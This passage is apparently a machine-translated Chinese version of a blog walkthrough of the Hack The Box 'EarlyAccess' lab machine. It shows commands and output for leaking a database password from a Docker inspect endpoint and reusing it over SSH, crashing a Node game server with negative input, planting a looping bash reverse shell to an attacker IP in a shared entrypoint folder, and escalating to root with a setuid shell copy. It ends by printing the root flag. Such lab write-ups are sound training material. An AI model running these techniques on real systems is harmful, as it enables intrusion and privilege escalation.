class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">环顾四周，我最终找到了那个api用户，并找到了这个:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="deff" class="mg km iq mc b gy mh mi l mj mk">www-adm@webserver:/var/www/html/app$ grep -ir api<br/>Models/API.php:class API extends Model<br/>Models/API.php:     * Verifies a game-key using the API<br/>Models/API.php:     * @return string //Returns response from API<br/>Models/API.php:     $response = Http::get('http://api:5000/verify/' . $key);</span></pre><p id="4d2b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">API.php文件有一个URL，我们可以使用wget来查看它:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="62e6" class="mg km iq mc b gy mh mi l mj mk">www-adm@webserver:/var/www/html/app$ wget http://api:5000<br/>--2022-02-04 16:53:38--  http://api:5000/<br/>Resolving api (api)... 172.18.0.101<br/>Connecting to api (api)|172.18.0.101|:5000... connected.<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 254 [application/json]<br/>index.html: Permission denied</span></pre><p id="2b55" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">对index.html的许可被拒绝。我需要在我的主文件夹中，所以wget使用配置文件:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="49e4" class="mg km iq mc b gy mh mi l mj mk">www-adm@webserver:/var/www/html/app$ cd ~<br/>www-adm@webserver:~$ wget http://api:5000/<br/>--2022-02-04 17:00:25--  http://api:5000/<br/>Resolving api (api)... 172.18.0.101<br/>Connecting to api (api)|172.18.0.101|:5000... connected.<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 254 [application/json]<br/>Saving to: ‘index.html’<br/>index.html      100%[============&gt;]     254  --.-KB/s    in 0s      <br/>2022-02-04 17:00:25 (18.3 MB/s) - ‘index.html’ saved [254/254]</span></pre><h1 id="fa56" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">验证API</h1><p id="3d19" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">查看索引文件:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="b9eb" class="mg km iq mc b gy mh mi l mj mk">www-adm@webserver:~$ cat index.html <br/>{"message":"Welcome to the game-key verification API! You can verify your keys via: /verify/&lt;game-key&gt;.<br/>If you are using manual verification, you have to synchronize the magic_num here.<br/>Admin users can verify the database using /check_db.","status":200}</span></pre><p id="8fb4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们获取check_db文件:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="5bb0" class="mg km iq mc b gy mh mi l mj mk">www-adm@webserver:~$ wget http://api:5000/check_db<br/>--2022-02-04 17:03:17--  http://api:5000/check_db<br/>Resolving api (api)... 172.18.0.101<br/>Connecting to api (api)|172.18.0.101|:5000... connected.<br/>HTTP request sent, awaiting response... 401 UNAUTHORIZED<br/>Authentication selected: Basic<br/>Connecting to api (api)|172.18.0.101|:5000... connected.<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 8708 (8.5K) [application/json]<br/>Saving to: ‘check_db’<br/>check_db     100%[==============&gt;]   8.50K  --.-KB/s    in 0s      <br/>2022-02-04 17:03:17 (108 MB/s) - ‘check_db’ saved [8708/8708]</span></pre><p id="06f6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看它的内容是json，所以复制到Kali并使用jq来读取它:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="93d2" class="mg km iq mc b gy mh mi l mj mk">┌──(root💀kali)-[~/htb/earlyaccess]<br/>└─# jq '.' check_db                                                    <br/>{<br/>  "message": {<br/>    "AppArmorProfile": "docker-default",<br/>    "Args": [<br/>      "--character-set-server=utf8mb4",<br/>      "--collation-server=utf8mb4_bin",<br/>      "--skip-character-set-client-handshake",<br/>      "--max_allowed_packet=50MB",<br/>      "--general_log=0",<br/>      "--sql_mode=ANSI_QUOTES,ERROR_FOR_DIVISION_BY_ZERO,IGNORE_SPACE,NO_ENGINE_SUBSTITUTION,NO_ZERO_DATE,NO_ZERO_IN_DATE,PIPES_AS_CONCAT,REAL_AS_FLOAT,STRICT_ALL_TABLES"<br/>    ],<br/>    "Config": {<br/>      "AttachStderr": false,<br/>      "AttachStdin": false,<br/>      "AttachStdout": false,<br/>      "Cmd": [<br/>&lt;SNIP&gt;</span></pre><p id="50e6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一个很长的文件，但是grep for password找到了一些凭证:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="8a81" class="mg km iq mc b gy mh mi l mj mk">┌──(root💀kali)-[~/htb/earlyaccess]<br/>└─# jq '.' check_db | grep -i password<br/>        "MYSQL_PASSWORD=drew",<br/>        "MYSQL_ROOT_PASSWORD=&lt;HIDDEN&gt;"</span></pre><h1 id="aed5" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Drew SSH访问</h1><p id="5de7" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">让我们通过SSH为用户drew尝试一下:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="05c0" class="mg km iq mc b gy mh mi l mj mk">┌──(root💀kali)-[~/htb/earlyaccess]<br/>└─# ssh drew@earlyaccess.htb       <br/>You have mail.<br/>Last login: Sun Sep  5 15:56:50 2021 from 10.10.14.6<br/>drew@earlyaccess:~$</span></pre><p id="18c1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们进去了。我注意到它说我们有邮件，让我们检查一下:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="cd94" class="mg km iq mc b gy mh mi l mj mk">drew@earlyaccess:~$ cat /var/mail/drew<br/>To: &lt;drew@earlyaccess.htb&gt;<br/>Subject: Game-server crash fixes<br/>From: game-adm &lt;game-adm@earlyaccess.htb&gt;<br/>Date: Thu May 27 8:10:34 2021<br/>Hi Drew!<br/>Thanks again for taking the time to test this very early version of our newest project! We have received your feedback and implemented a healthcheck that will automatically restart the game-server if it has crashed (sorry for the current instability of the game! We are working on it...) <br/>If the game hangs now, the server will restart and be available again after about a minute. If you find any other problems, please don't hesitate to report them!<br/>Thank you for your efforts!<br/>Game-adm (and the entire EarlyAccess Studios team)</span></pre><p id="49ba" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它告诉我们，游戏服务器将自动重启，如果它挂起或崩溃。我还在drew的主文件夹中找到了这个ssh文件:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="70c1" class="mg km iq mc b gy mh mi l mj mk">drew@earlyaccess:~$ cat .ssh/id_rsa.pub <br/>ssh-rsa AAAAB3NzaC1y&lt;SNIP&gt;c2myZjHXDw77nvettGYr5lcS8w== game-tester@game-server</span></pre><p id="b37d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以用它作为游戏测试者登录游戏服务器。看看IP，我们看到了另一个容器:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="f1c4" class="mg km iq mc b gy mh mi l mj mk">drew@earlyaccess:~$ ip n 2&gt;/dev/null<br/>172.19.0.2 dev br-b052cf9302f7 lladdr 02:42:ac:13:00:02 STALE<br/>172.18.0.2 dev br-6489f03765ae lladdr 02:42:ac:12:00:02 STALE<br/>172.18.0.102 dev br-6489f03765ae lladdr 02:42:ac:12:00:66 STALE<br/>10.10.10.2 dev ens160 lladdr 00:50:56:b9:72:c3 REACHABLE</span></pre><h1 id="4521" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">游戏服务器</h1><p id="fc78" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">让我们登录到那里:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="3634" class="mg km iq mc b gy mh mi l mj mk">drew@earlyaccess:~$ ssh game-tester@172.19.0.2<br/>game-tester@game-server:~$</span></pre><p id="44b1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">是时候进行一些枚举了。查看根文件夹:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="a2d9" class="mg km iq mc b gy mh mi l mj mk">game-tester@game-server:~$ ls -lsa /<br/>4 drwxrwxr-t   2 root 1000 4096 Feb  4 17:57 docker-entrypoint.d<br/>4 -rwxr-xr--   1 root root  141 Aug 19 14:15 entrypoint.sh</span></pre><p id="d28a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看看入口点脚本:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="52e7" class="mg km iq mc b gy mh mi l mj mk">game-tester@game-server:~$ cat /entrypoint.sh <br/>#!/bin/bash<br/>for ep in /docker-entrypoint.d/*; do<br/>if [ -x "${ep}" ]; then<br/>    echo "Running: ${ep}"<br/>    "${ep}" &amp;<br/>  fi<br/>done<br/>tail -f /dev/null</span></pre><p id="6862" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个脚本归root所有，运行docker-entrypoint.d文件夹中的任何东西。在那里我们看到一个脚本，让我们看看它的内容:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="e5f9" class="mg km iq mc b gy mh mi l mj mk">game-tester@game-server:~$ cat /docker-entrypoint.d/node-server.sh  <br/>service ssh start<br/>cd /usr/src/app<br/># Install dependencies<br/>npm install<br/>sudo -u node node server.js</span></pre><p id="24d1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">名为server.js的脚本正在/usr/src/app文件夹中运行。查看该脚本，我们看到它是一个井字游戏，并且正在侦听端口9999。有一个自动播放功能，让我们指定要播放多少回合，让我们从早期访问服务器上的SSH会话中尝试一下:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="4de4" class="mg km iq mc b gy mh mi l mj mk">drew@earlyaccess:~$ curl -X POST -d "rounds=3" http://172.19.0.4:9999/autoplay <br/>&lt;html&gt;<br/>  &lt;body&gt;<br/>    &lt;h1&gt;Starting autoplay with 3 rounds&lt;/h1&gt;<br/>    &lt;h4&gt;Stats:&lt;/h4&gt;<br/>    &lt;p&gt;Wins: 1&lt;/p&gt;<br/>    &lt;p&gt;Losses: 2&lt;/p&gt;<br/>    &lt;p&gt;Ties: 0&lt;/p&gt;<br/>    &lt;a href="/autoplay"&gt;Go back&lt;/a&gt;<br/>  &lt;/body&gt;<br/>&lt;/html&gt;</span></pre><p id="ce09" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在脚本中，我们还看到了这一点:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="ae90" class="mg km iq mc b gy mh mi l mj mk">// Stop execution if too many rounds are specified (performance issues may occur otherwise)<br/>  if (req.body.rounds &gt; 100)<br/>  {<br/>    res.sendStatus(500);<br/>    return;<br/>  }</span></pre><h1 id="f437" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">游戏服务器崩溃</h1><p id="34be" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">因此，要在游戏服务器上获得根，我们需要一种使服务器崩溃的方法，然后当它重新启动时，我们需要在/docker-entrypoint.d/文件夹中有一个带有反向shell的文件，这样它就可以执行了。</p><p id="7324" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在gameserver上我们看到这个:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="faf3" class="mg km iq mc b gy mh mi l mj mk">game-tester@game-server:~$ ls -l /<br/>drwxrwxr-t   2 root 1000 4096 Feb  6 11:38 docker-entrypoint.d</span></pre><p id="f348" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在早期访问服务器上，我们看到了这个:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="62bf" class="mg km iq mc b gy mh mi l mj mk">drew@earlyaccess:~$ ls -l /opt<br/>total 8<br/>drwx--x--x 4 root root 4096 Jul 14  2021 containerd<br/>drwxrwxr-t 2 root drew 4096 Feb  6 12:39 docker-entrypoint.d</span></pre><p id="9ac1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，我们可以对earlyaccess服务器上的文件夹进行写访问，该文件夹安装在游戏服务器上。让我们放一个反向外壳进去，然后让游戏崩溃。我们需要循环执行此操作，因为有一个清理任务正在运行，它每分钟都会清空docker-entrypoint.d文件夹:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="e9f3" class="mg km iq mc b gy mh mi l mj mk">drew@earlyaccess:~$ while true; do echo "bash -i &gt;&amp; /dev/tcp/10.10.14.12/1337 0&gt;&amp;1" &gt; /opt/docker-entrypoint.d/pencer.sh &amp;&amp; chmod +x /opt/docker-entrypoint.d/pencer.sh &amp;&amp; sleep 1; done</span></pre><p id="eb36" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让它保持运行状态，并启动另一个SSH会话，如drew to earlyaccess.htb所示。</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="9336" class="mg km iq mc b gy mh mi l mj mk">drew@earlyaccess:/opt/docker-entrypoint.d$ curl -X POST -d "rounds=-3" http://172.19.0.3:9999/autoplay<br/>curl: (52) Empty reply from server</span></pre><h1 id="d7bb" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">根访问</h1><p id="34a5" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">在你的Kali上有一个netcat监听器等待，当上面的程序使游戏服务器崩溃时，我们会看到它以root用户的身份连接到我们:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="1d68" class="mg km iq mc b gy mh mi l mj mk">┌──(root💀kali)-[~]<br/>└─# nc -nlvp 1337<br/>listening on [any] 1337 ...<br/>connect to [10.10.14.12] from (UNKNOWN) [10.10.11.110] 59062<br/>bash: cannot set terminal process group (1): Inappropriate ioctl for device<br/>bash: no job control in this shell<br/>root@game-server:/usr/src/app#</span></pre><p id="c0d7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们是游戏服务器的root用户，我们可以将/bin/sh复制到共享文件夹，并给它一个粘性位:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="6317" class="mg km iq mc b gy mh mi l mj mk">root@game-server:/# cd docker-entrypoint.d<br/>root@game-server:/docker-entrypoint.d# cp /bin/sh . &amp;&amp; chmod u+s sh</span></pre><p id="2293" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后，回到早期访问，作为drew，我们可以升级到root并获取标志:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="fe9e" class="mg km iq mc b gy mh mi l mj mk">drew@earlyaccess:/opt/docker-entrypoint.d$ ls -lsa<br/>  4 -rwxr-xr-x 1 root root    100 Feb  6 13:23 node-server.sh<br/>  4 -rwxr-xr-x 1 drew drew     42 Feb  6 13:23 pencer.sh<br/>116 -rwsr-xr-x 1 root root 117208 Feb  6 13:23 sh</span><span id="41ab" class="mg km iq mc b gy nd mi l mj mk">drew@earlyaccess:/opt/docker-entrypoint.d$ ./sh<br/>#<br/># id<br/>uid=1000(drew) gid=1000(drew) euid=0(root) groups=1000(drew)<br/>#<br/># cat /root/root.txt<br/>913303c08fc7d61d3b3a8e31db502e01</span></pre><p id="e8f3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">完成了。对我来说，这真的是一个很难的盒子，但很愉快，我在这个过程中学到了一些东西。希望这个演练也能帮助你。下次见。</p></div><div class="ab cl ni nj hu nk" role="separator"><span class="nl bw bk nm nn no"/><span class="nl bw bk nm nn no"/><span class="nl bw bk nm nn"/></div><div class="ij ik il im in"><p id="50c6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)</p><p id="2917" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">推特—<a class="ae lv" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>网站— <a class="ae lv" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="51d7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="np">原载于2022年2月8日</em><a class="ae lv" href="https://pencer.io/ctf/ctf-htb-earlyaccess" rel="noopener ugc nofollow" target="_blank"><em class="np">https://pencer . io</em></a><em class="np">。</em></p></div></div>    
</body>
</html>